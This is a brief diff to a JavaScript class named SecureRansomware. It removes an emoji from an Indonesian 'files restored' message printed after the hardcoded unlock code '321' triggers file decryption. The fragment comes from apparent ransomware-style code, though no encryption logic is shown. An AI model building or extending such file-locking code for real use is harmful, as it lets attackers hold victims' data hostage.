@@ -116,7 +116,7 @@ class SecureRansomware {
         if (input === "321") {
           rl.close();
           await this.decryptFiles();
-          console.log("\n[✓] File berhasil dipulihkan 🎉");
+          console.log("\n[✓] File berhasil dipulihkan");
           process.exit(0);
         } else {
           this.attempts++;
